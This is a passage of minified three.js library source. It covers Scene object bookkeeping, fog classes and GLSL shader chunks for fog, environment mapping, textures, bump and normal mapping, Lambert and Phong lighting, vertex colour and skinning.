THREE.Scene.prototype.__addObject=function(a){if(a instanceof THREE.Light)-1===this.__lights.indexOf(a)&&this.__lights.push(a),a.target&&void 0===a.target.parent&&this.add(a.target);else if(!(a instanceof THREE.Camera||a instanceof THREE.Bone)&&-1===this.__objects.indexOf(a)){this.__objects.push(a);this.__objectsAdded.push(a);var b=this.__objectsRemoved.indexOf(a);-1!==b&&this.__objectsRemoved.splice(b,1)}for(b=0;b<a.children.length;b++)this.__addObject(a.children[b])};
THREE.Scene.prototype.__removeObject=function(a){if(a instanceof THREE.Light){var b=this.__lights.indexOf(a);-1!==b&&this.__lights.splice(b,1)}else a instanceof THREE.Camera||(b=this.__objects.indexOf(a),-1!==b&&(this.__objects.splice(b,1),this.__objectsRemoved.push(a),b=this.__objectsAdded.indexOf(a),-1!==b&&this.__objectsAdded.splice(b,1)));for(b=0;b<a.children.length;b++)this.__removeObject(a.children[b])};
THREE.Fog=function(a,b,c){this.name="";this.color=new THREE.Color(a);this.near=void 0!==b?b:1;this.far=void 0!==c?c:1E3};THREE.Fog.prototype.clone=function(){return new THREE.Fog(this.color.getHex(),this.near,this.far)};THREE.FogExp2=function(a,b){this.name="";this.color=new THREE.Color(a);this.density=void 0!==b?b:2.5E-4};THREE.FogExp2.prototype.clone=function(){return new THREE.FogExp2(this.color.getHex(),this.density)};
THREE.ShaderChunk={fog_pars_fragment:"#ifdef USE_FOG\nuniform vec3 fogColor;\n#ifdef FOG_EXP2\nuniform float fogDensity;\n#else\nuniform float fogNear;\nuniform float fogFar;\n#endif\n#endif",fog_fragment:"#ifdef USE_FOG\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\n#ifdef FOG_EXP2\nconst float LOG2 = 1.442695;\nfloat fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );\nfogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );\n#else\nfloat fogFactor = smoothstep( fogNear, fogFar, depth );\n#endif\ngl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );\n#endif",
envmap_pars_fragment:"#ifdef USE_ENVMAP\nuniform float reflectivity;\nuniform samplerCube envMap;\nuniform float flipEnvMap;\nuniform int combine;\n#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\nuniform bool useRefract;\nuniform float refractionRatio;\n#else\nvarying vec3 vReflect;\n#endif\n#endif",envmap_fragment:"#ifdef USE_ENVMAP\nvec3 reflectVec;\n#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP )\nvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\nif ( useRefract ) {\nreflectVec = refract( cameraToVertex, normal, refractionRatio );\n} else { \nreflectVec = reflect( cameraToVertex, normal );\n}\n#else\nreflectVec = vReflect;\n#endif\n#ifdef DOUBLE_SIDED\nfloat flipNormal = ( -1.0 + 2.0 * float( gl_FrontFacing ) );\nvec4 cubeColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n#else\nvec4 cubeColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n#endif\n#ifdef GAMMA_INPUT\ncubeColor.xyz *= cubeColor.xyz;\n#endif\nif ( combine == 1 ) {\ngl_FragColor.xyz = mix( gl_FragColor.xyz, cubeColor.xyz, specularStrength * reflectivity );\n} else if ( combine == 2 ) {\ngl_FragColor.xyz += cubeColor.xyz * specularStrength * reflectivity;\n} else {\ngl_FragColor.xyz = mix( gl_FragColor.xyz, gl_FragColor.xyz * cubeColor.xyz, specularStrength * reflectivity );\n}\n#endif",
envmap_pars_vertex:"#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP )\nvarying vec3 vReflect;\nuniform float refractionRatio;\nuniform bool useRefract;\n#endif",worldpos_vertex:"#if defined( USE_ENVMAP ) || defined( PHONG ) || defined( LAMBERT ) || defined ( USE_SHADOWMAP )\n#ifdef USE_SKINNING\nvec4 worldPosition = modelMatrix * skinned;\n#endif\n#if defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )\nvec4 worldPosition = modelMatrix * vec4( morphed, 1.0 );\n#endif\n#if ! defined( USE_MORPHTARGETS ) && ! defined( USE_SKINNING )\nvec4 worldPosition = modelMatrix * vec4( position, 1.0 );\n#endif\n#endif",
envmap_vertex:"#if defined( USE_ENVMAP ) && ! defined( USE_BUMPMAP ) && ! defined( USE_NORMALMAP )\nvec3 worldNormal = mat3( modelMatrix[ 0 ].xyz, modelMatrix[ 1 ].xyz, modelMatrix[ 2 ].xyz ) * objectNormal;\nworldNormal = normalize( worldNormal );\nvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\nif ( useRefract ) {\nvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n} else {\nvReflect = reflect( cameraToVertex, worldNormal );\n}\n#endif",map_particle_pars_fragment:"#ifdef USE_MAP\nuniform sampler2D map;\n#endif",
map_particle_fragment:"#ifdef USE_MAP\ngl_FragColor = gl_FragColor * texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) );\n#endif",map_pars_vertex:"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )\nvarying vec2 vUv;\nuniform vec4 offsetRepeat;\n#endif",map_pars_fragment:"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )\nvarying vec2 vUv;\n#endif\n#ifdef USE_MAP\nuniform sampler2D map;\n#endif",
map_vertex:"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP )\nvUv = uv * offsetRepeat.zw + offsetRepeat.xy;\n#endif",map_fragment:"#ifdef USE_MAP\nvec4 texelColor = texture2D( map, vUv );\n#ifdef GAMMA_INPUT\ntexelColor.xyz *= texelColor.xyz;\n#endif\ngl_FragColor = gl_FragColor * texelColor;\n#endif",lightmap_pars_fragment:"#ifdef USE_LIGHTMAP\nvarying vec2 vUv2;\nuniform sampler2D lightMap;\n#endif",lightmap_pars_vertex:"#ifdef USE_LIGHTMAP\nvarying vec2 vUv2;\n#endif",
lightmap_fragment:"#ifdef USE_LIGHTMAP\ngl_FragColor = gl_FragColor * texture2D( lightMap, vUv2 );\n#endif",lightmap_vertex:"#ifdef USE_LIGHTMAP\nvUv2 = uv2;\n#endif",bumpmap_pars_fragment:"#ifdef USE_BUMPMAP\nuniform sampler2D bumpMap;\nuniform float bumpScale;\nvec2 dHdxy_fwd() {\nvec2 dSTdx = dFdx( vUv );\nvec2 dSTdy = dFdy( vUv );\nfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\nfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\nfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\nreturn vec2( dBx, dBy );\n}\nvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\nvec3 vSigmaX = dFdx( surf_pos );\nvec3 vSigmaY = dFdy( surf_pos );\nvec3 vN = surf_norm;\nvec3 R1 = cross( vSigmaY, vN );\nvec3 R2 = cross( vN, vSigmaX );\nfloat fDet = dot( vSigmaX, R1 );\nvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\nreturn normalize( abs( fDet ) * surf_norm - vGrad );\n}\n#endif",
normalmap_pars_fragment:"#ifdef USE_NORMALMAP\nuniform sampler2D normalMap;\nuniform vec2 normalScale;\nvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\nvec3 q0 = dFdx( eye_pos.xyz );\nvec3 q1 = dFdy( eye_pos.xyz );\nvec2 st0 = dFdx( vUv.st );\nvec2 st1 = dFdy( vUv.st );\nvec3 S = normalize(  q0 * st1.t - q1 * st0.t );\nvec3 T = normalize( -q0 * st1.s + q1 * st0.s );\nvec3 N = normalize( surf_norm );\nvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\nmapN.xy = normalScale * mapN.xy;\nmat3 tsn = mat3( S, T, N );\nreturn normalize( tsn * mapN );\n}\n#endif",
specularmap_pars_fragment:"#ifdef USE_SPECULARMAP\nuniform sampler2D specularMap;\n#endif",specularmap_fragment:"float specularStrength;\n#ifdef USE_SPECULARMAP\nvec4 texelSpecular = texture2D( specularMap, vUv );\nspecularStrength = texelSpecular.r;\n#else\nspecularStrength = 1.0;\n#endif",lights_lambert_pars_vertex:"uniform vec3 ambient;\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform vec3 ambientLightColor;\n#if MAX_DIR_LIGHTS > 0\nuniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];\nuniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];\n#endif\n#if MAX_HEMI_LIGHTS > 0\nuniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];\nuniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];\nuniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];\n#endif\n#if MAX_POINT_LIGHTS > 0\nuniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];\nuniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];\nuniform float pointLightDistance[ MAX_POINT_LIGHTS ];\n#endif\n#if MAX_SPOT_LIGHTS > 0\nuniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];\nuniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];\nuniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];\nuniform float spotLightDistance[ MAX_SPOT_LIGHTS ];\nuniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];\nuniform float spotLightExponent[ MAX_SPOT_LIGHTS ];\n#endif\n#ifdef WRAP_AROUND\nuniform vec3 wrapRGB;\n#endif",
lights_lambert_vertex:"vLightFront = vec3( 0.0 );\n#ifdef DOUBLE_SIDED\nvLightBack = vec3( 0.0 );\n#endif\ntransformedNormal = normalize( transformedNormal );\n#if MAX_DIR_LIGHTS > 0\nfor( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {\nvec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );\nvec3 dirVector = normalize( lDirection.xyz );\nfloat dotProduct = dot( transformedNormal, dirVector );\nvec3 directionalLightWeighting = vec3( max( dotProduct, 0.0 ) );\n#ifdef DOUBLE_SIDED\nvec3 directionalLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );\n#ifdef WRAP_AROUND\nvec3 directionalLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );\n#endif\n#endif\n#ifdef WRAP_AROUND\nvec3 directionalLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );\ndirectionalLightWeighting = mix( directionalLightWeighting, directionalLightWeightingHalf, wrapRGB );\n#ifdef DOUBLE_SIDED\ndirectionalLightWeightingBack = mix( directionalLightWeightingBack, directionalLightWeightingHalfBack, wrapRGB );\n#endif\n#endif\nvLightFront += directionalLightColor[ i ] * directionalLightWeighting;\n#ifdef DOUBLE_SIDED\nvLightBack += directionalLightColor[ i ] * directionalLightWeightingBack;\n#endif\n}\n#endif\n#if MAX_POINT_LIGHTS > 0\nfor( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {\nvec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );\nvec3 lVector = lPosition.xyz - mvPosition.xyz;\nfloat lDistance = 1.0;\nif ( pointLightDistance[ i ] > 0.0 )\nlDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );\nlVector = normalize( lVector );\nfloat dotProduct = dot( transformedNormal, lVector );\nvec3 pointLightWeighting = vec3( max( dotProduct, 0.0 ) );\n#ifdef DOUBLE_SIDED\nvec3 pointLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );\n#ifdef WRAP_AROUND\nvec3 pointLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );\n#endif\n#endif\n#ifdef WRAP_AROUND\nvec3 pointLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );\npointLightWeighting = mix( pointLightWeighting, pointLightWeightingHalf, wrapRGB );\n#ifdef DOUBLE_SIDED\npointLightWeightingBack = mix( pointLightWeightingBack, pointLightWeightingHalfBack, wrapRGB );\n#endif\n#endif\nvLightFront += pointLightColor[ i ] * pointLightWeighting * lDistance;\n#ifdef DOUBLE_SIDED\nvLightBack += pointLightColor[ i ] * pointLightWeightingBack * lDistance;\n#endif\n}\n#endif\n#if MAX_SPOT_LIGHTS > 0\nfor( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {\nvec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );\nvec3 lVector = lPosition.xyz - mvPosition.xyz;\nfloat spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - worldPosition.xyz ) );\nif ( spotEffect > spotLightAngleCos[ i ] ) {\nspotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );\nfloat lDistance = 1.0;\nif ( spotLightDistance[ i ] > 0.0 )\nlDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );\nlVector = normalize( lVector );\nfloat dotProduct = dot( transformedNormal, lVector );\nvec3 spotLightWeighting = vec3( max( dotProduct, 0.0 ) );\n#ifdef DOUBLE_SIDED\nvec3 spotLightWeightingBack = vec3( max( -dotProduct, 0.0 ) );\n#ifdef WRAP_AROUND\nvec3 spotLightWeightingHalfBack = vec3( max( -0.5 * dotProduct + 0.5, 0.0 ) );\n#endif\n#endif\n#ifdef WRAP_AROUND\nvec3 spotLightWeightingHalf = vec3( max( 0.5 * dotProduct + 0.5, 0.0 ) );\nspotLightWeighting = mix( spotLightWeighting, spotLightWeightingHalf, wrapRGB );\n#ifdef DOUBLE_SIDED\nspotLightWeightingBack = mix( spotLightWeightingBack, spotLightWeightingHalfBack, wrapRGB );\n#endif\n#endif\nvLightFront += spotLightColor[ i ] * spotLightWeighting * lDistance * spotEffect;\n#ifdef DOUBLE_SIDED\nvLightBack += spotLightColor[ i ] * spotLightWeightingBack * lDistance * spotEffect;\n#endif\n}\n}\n#endif\n#if MAX_HEMI_LIGHTS > 0\nfor( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {\nvec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );\nvec3 lVector = normalize( lDirection.xyz );\nfloat dotProduct = dot( transformedNormal, lVector );\nfloat hemiDiffuseWeight = 0.5 * dotProduct + 0.5;\nfloat hemiDiffuseWeightBack = -0.5 * dotProduct + 0.5;\nvLightFront += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );\n#ifdef DOUBLE_SIDED\nvLightBack += mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeightBack );\n#endif\n}\n#endif\nvLightFront = vLightFront * diffuse + ambient * ambientLightColor + emissive;\n#ifdef DOUBLE_SIDED\nvLightBack = vLightBack * diffuse + ambient * ambientLightColor + emissive;\n#endif",
lights_phong_pars_vertex:"#ifndef PHONG_PER_PIXEL\n#if MAX_POINT_LIGHTS > 0\nuniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];\nuniform float pointLightDistance[ MAX_POINT_LIGHTS ];\nvarying vec4 vPointLight[ MAX_POINT_LIGHTS ];\n#endif\n#if MAX_SPOT_LIGHTS > 0\nuniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];\nuniform float spotLightDistance[ MAX_SPOT_LIGHTS ];\nvarying vec4 vSpotLight[ MAX_SPOT_LIGHTS ];\n#endif\n#endif\n#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP )\nvarying vec3 vWorldPosition;\n#endif",
lights_phong_vertex:"#ifndef PHONG_PER_PIXEL\n#if MAX_POINT_LIGHTS > 0\nfor( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {\nvec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );\nvec3 lVector = lPosition.xyz - mvPosition.xyz;\nfloat lDistance = 1.0;\nif ( pointLightDistance[ i ] > 0.0 )\nlDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );\nvPointLight[ i ] = vec4( lVector, lDistance );\n}\n#endif\n#if MAX_SPOT_LIGHTS > 0\nfor( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {\nvec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );\nvec3 lVector = lPosition.xyz - mvPosition.xyz;\nfloat lDistance = 1.0;\nif ( spotLightDistance[ i ] > 0.0 )\nlDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );\nvSpotLight[ i ] = vec4( lVector, lDistance );\n}\n#endif\n#endif\n#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP )\nvWorldPosition = worldPosition.xyz;\n#endif",
lights_phong_pars_fragment:"uniform vec3 ambientLightColor;\n#if MAX_DIR_LIGHTS > 0\nuniform vec3 directionalLightColor[ MAX_DIR_LIGHTS ];\nuniform vec3 directionalLightDirection[ MAX_DIR_LIGHTS ];\n#endif\n#if MAX_HEMI_LIGHTS > 0\nuniform vec3 hemisphereLightSkyColor[ MAX_HEMI_LIGHTS ];\nuniform vec3 hemisphereLightGroundColor[ MAX_HEMI_LIGHTS ];\nuniform vec3 hemisphereLightDirection[ MAX_HEMI_LIGHTS ];\n#endif\n#if MAX_POINT_LIGHTS > 0\nuniform vec3 pointLightColor[ MAX_POINT_LIGHTS ];\n#ifdef PHONG_PER_PIXEL\nuniform vec3 pointLightPosition[ MAX_POINT_LIGHTS ];\nuniform float pointLightDistance[ MAX_POINT_LIGHTS ];\n#else\nvarying vec4 vPointLight[ MAX_POINT_LIGHTS ];\n#endif\n#endif\n#if MAX_SPOT_LIGHTS > 0\nuniform vec3 spotLightColor[ MAX_SPOT_LIGHTS ];\nuniform vec3 spotLightPosition[ MAX_SPOT_LIGHTS ];\nuniform vec3 spotLightDirection[ MAX_SPOT_LIGHTS ];\nuniform float spotLightAngleCos[ MAX_SPOT_LIGHTS ];\nuniform float spotLightExponent[ MAX_SPOT_LIGHTS ];\n#ifdef PHONG_PER_PIXEL\nuniform float spotLightDistance[ MAX_SPOT_LIGHTS ];\n#else\nvarying vec4 vSpotLight[ MAX_SPOT_LIGHTS ];\n#endif\n#endif\n#if MAX_SPOT_LIGHTS > 0 || defined( USE_BUMPMAP )\nvarying vec3 vWorldPosition;\n#endif\n#ifdef WRAP_AROUND\nuniform vec3 wrapRGB;\n#endif\nvarying vec3 vViewPosition;\nvarying vec3 vNormal;",
lights_phong_fragment:"vec3 normal = normalize( vNormal );\nvec3 viewPosition = normalize( vViewPosition );\n#ifdef DOUBLE_SIDED\nnormal = normal * ( -1.0 + 2.0 * float( gl_FrontFacing ) );\n#endif\n#ifdef USE_NORMALMAP\nnormal = perturbNormal2Arb( -vViewPosition, normal );\n#elif defined( USE_BUMPMAP )\nnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\n#endif\n#if MAX_POINT_LIGHTS > 0\nvec3 pointDiffuse  = vec3( 0.0 );\nvec3 pointSpecular = vec3( 0.0 );\nfor ( int i = 0; i < MAX_POINT_LIGHTS; i ++ ) {\n#ifdef PHONG_PER_PIXEL\nvec4 lPosition = viewMatrix * vec4( pointLightPosition[ i ], 1.0 );\nvec3 lVector = lPosition.xyz + vViewPosition.xyz;\nfloat lDistance = 1.0;\nif ( pointLightDistance[ i ] > 0.0 )\nlDistance = 1.0 - min( ( length( lVector ) / pointLightDistance[ i ] ), 1.0 );\nlVector = normalize( lVector );\n#else\nvec3 lVector = normalize( vPointLight[ i ].xyz );\nfloat lDistance = vPointLight[ i ].w;\n#endif\nfloat dotProduct = dot( normal, lVector );\n#ifdef WRAP_AROUND\nfloat pointDiffuseWeightFull = max( dotProduct, 0.0 );\nfloat pointDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );\nvec3 pointDiffuseWeight = mix( vec3 ( pointDiffuseWeightFull ), vec3( pointDiffuseWeightHalf ), wrapRGB );\n#else\nfloat pointDiffuseWeight = max( dotProduct, 0.0 );\n#endif\npointDiffuse  += diffuse * pointLightColor[ i ] * pointDiffuseWeight * lDistance;\nvec3 pointHalfVector = normalize( lVector + viewPosition );\nfloat pointDotNormalHalf = max( dot( normal, pointHalfVector ), 0.0 );\nfloat pointSpecularWeight = specularStrength * max( pow( pointDotNormalHalf, shininess ), 0.0 );\n#ifdef PHYSICALLY_BASED_SHADING\nfloat specularNormalization = ( shininess + 2.0001 ) / 8.0;\nvec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, pointHalfVector ), 5.0 );\npointSpecular += schlick * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * lDistance * specularNormalization;\n#else\npointSpecular += specular * pointLightColor[ i ] * pointSpecularWeight * pointDiffuseWeight * lDistance;\n#endif\n}\n#endif\n#if MAX_SPOT_LIGHTS > 0\nvec3 spotDiffuse  = vec3( 0.0 );\nvec3 spotSpecular = vec3( 0.0 );\nfor ( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {\n#ifdef PHONG_PER_PIXEL\nvec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );\nvec3 lVector = lPosition.xyz + vViewPosition.xyz;\nfloat lDistance = 1.0;\nif ( spotLightDistance[ i ] > 0.0 )\nlDistance = 1.0 - min( ( length( lVector ) / spotLightDistance[ i ] ), 1.0 );\nlVector = normalize( lVector );\n#else\nvec3 lVector = normalize( vSpotLight[ i ].xyz );\nfloat lDistance = vSpotLight[ i ].w;\n#endif\nfloat spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) );\nif ( spotEffect > spotLightAngleCos[ i ] ) {\nspotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );\nfloat dotProduct = dot( normal, lVector );\n#ifdef WRAP_AROUND\nfloat spotDiffuseWeightFull = max( dotProduct, 0.0 );\nfloat spotDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );\nvec3 spotDiffuseWeight = mix( vec3 ( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB );\n#else\nfloat spotDiffuseWeight = max( dotProduct, 0.0 );\n#endif\nspotDiffuse += diffuse * spotLightColor[ i ] * spotDiffuseWeight * lDistance * spotEffect;\nvec3 spotHalfVector = normalize( lVector + viewPosition );\nfloat spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 );\nfloat spotSpecularWeight = specularStrength * max( pow( spotDotNormalHalf, shininess ), 0.0 );\n#ifdef PHYSICALLY_BASED_SHADING\nfloat specularNormalization = ( shininess + 2.0001 ) / 8.0;\nvec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, spotHalfVector ), 5.0 );\nspotSpecular += schlick * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * lDistance * specularNormalization * spotEffect;\n#else\nspotSpecular += specular * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * lDistance * spotEffect;\n#endif\n}\n}\n#endif\n#if MAX_DIR_LIGHTS > 0\nvec3 dirDiffuse  = vec3( 0.0 );\nvec3 dirSpecular = vec3( 0.0 );\nfor( int i = 0; i < MAX_DIR_LIGHTS; i ++ ) {\nvec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );\nvec3 dirVector = normalize( lDirection.xyz );\nfloat dotProduct = dot( normal, dirVector );\n#ifdef WRAP_AROUND\nfloat dirDiffuseWeightFull = max( dotProduct, 0.0 );\nfloat dirDiffuseWeightHalf = max( 0.5 * dotProduct + 0.5, 0.0 );\nvec3 dirDiffuseWeight = mix( vec3( dirDiffuseWeightFull ), vec3( dirDiffuseWeightHalf ), wrapRGB );\n#else\nfloat dirDiffuseWeight = max( dotProduct, 0.0 );\n#endif\ndirDiffuse  += diffuse * directionalLightColor[ i ] * dirDiffuseWeight;\nvec3 dirHalfVector = normalize( dirVector + viewPosition );\nfloat dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 );\nfloat dirSpecularWeight = specularStrength * max( pow( dirDotNormalHalf, shininess ), 0.0 );\n#ifdef PHYSICALLY_BASED_SHADING\nfloat specularNormalization = ( shininess + 2.0001 ) / 8.0;\nvec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( dirVector, dirHalfVector ), 5.0 );\ndirSpecular += schlick * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization;\n#else\ndirSpecular += specular * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight;\n#endif\n}\n#endif\n#if MAX_HEMI_LIGHTS > 0\nvec3 hemiDiffuse  = vec3( 0.0 );\nvec3 hemiSpecular = vec3( 0.0 );\nfor( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {\nvec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );\nvec3 lVector = normalize( lDirection.xyz );\nfloat dotProduct = dot( normal, lVector );\nfloat hemiDiffuseWeight = 0.5 * dotProduct + 0.5;\nvec3 hemiColor = mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );\nhemiDiffuse += diffuse * hemiColor;\nvec3 hemiHalfVectorSky = normalize( lVector + viewPosition );\nfloat hemiDotNormalHalfSky = 0.5 * dot( normal, hemiHalfVectorSky ) + 0.5;\nfloat hemiSpecularWeightSky = specularStrength * max( pow( hemiDotNormalHalfSky, shininess ), 0.0 );\nvec3 lVectorGround = -lVector;\nvec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition );\nfloat hemiDotNormalHalfGround = 0.5 * dot( normal, hemiHalfVectorGround ) + 0.5;\nfloat hemiSpecularWeightGround = specularStrength * max( pow( hemiDotNormalHalfGround, shininess ), 0.0 );\n#ifdef PHYSICALLY_BASED_SHADING\nfloat dotProductGround = dot( normal, lVectorGround );\nfloat specularNormalization = ( shininess + 2.0001 ) / 8.0;\nvec3 schlickSky = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, hemiHalfVectorSky ), 5.0 );\nvec3 schlickGround = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 5.0 );\nhemiSpecular += hemiColor * specularNormalization * ( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) );\n#else\nhemiSpecular += specular * hemiColor * ( hemiSpecularWeightSky + hemiSpecularWeightGround ) * hemiDiffuseWeight;\n#endif\n}\n#endif\nvec3 totalDiffuse = vec3( 0.0 );\nvec3 totalSpecular = vec3( 0.0 );\n#if MAX_DIR_LIGHTS > 0\ntotalDiffuse += dirDiffuse;\ntotalSpecular += dirSpecular;\n#endif\n#if MAX_HEMI_LIGHTS > 0\ntotalDiffuse += hemiDiffuse;\ntotalSpecular += hemiSpecular;\n#endif\n#if MAX_POINT_LIGHTS > 0\ntotalDiffuse += pointDiffuse;\ntotalSpecular += pointSpecular;\n#endif\n#if MAX_SPOT_LIGHTS > 0\ntotalDiffuse += spotDiffuse;\ntotalSpecular += spotSpecular;\n#endif\n#ifdef METAL\ngl_FragColor.xyz = gl_FragColor.xyz * ( emissive + totalDiffuse + ambientLightColor * ambient + totalSpecular );\n#else\ngl_FragColor.xyz = gl_FragColor.xyz * ( emissive + totalDiffuse + ambientLightColor * ambient ) + totalSpecular;\n#endif",
color_pars_fragment:"#ifdef USE_COLOR\nvarying vec3 vColor;\n#endif",color_fragment:"#ifdef USE_COLOR\ngl_FragColor = gl_FragColor * vec4( vColor, opacity );\n#endif",color_pars_vertex:"#ifdef USE_COLOR\nvarying vec3 vColor;\n#endif",color_vertex:"#ifdef USE_COLOR\n#ifdef GAMMA_INPUT\nvColor = color * color;\n#else\nvColor = color;\n#endif\n#endif",skinning_pars_vertex:"#ifdef USE_SKINNING\n#ifdef BONE_TEXTURE\nuniform sampler2D boneTexture;\nmat4 getBoneMatrix( const in float i ) {\nfloat j = i * 4.0;\nfloat x = mod( j, N_BONE_PIXEL_X );\nfloat y = floor( j / N_BONE_PIXEL_X );\nconst float dx = 1.0 / N_BONE_PIXEL_X;\nconst float dy = 1.0 / N_BONE_PIXEL_Y;\ny = dy * ( y + 0.5 );\nvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\nvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\nvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\nvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\nmat4 bone = mat4( v1, v2, v3, v4 );\nreturn bone;\n}\n#else\nuniform mat4 boneGlobalMatrices[ MAX_BONES ];\nmat4 getBoneMatrix( const in float i ) {\nmat4 bone = boneGlobalMatrices[ int(i) ];\nreturn bone;\n}\n#endif\n#endif",
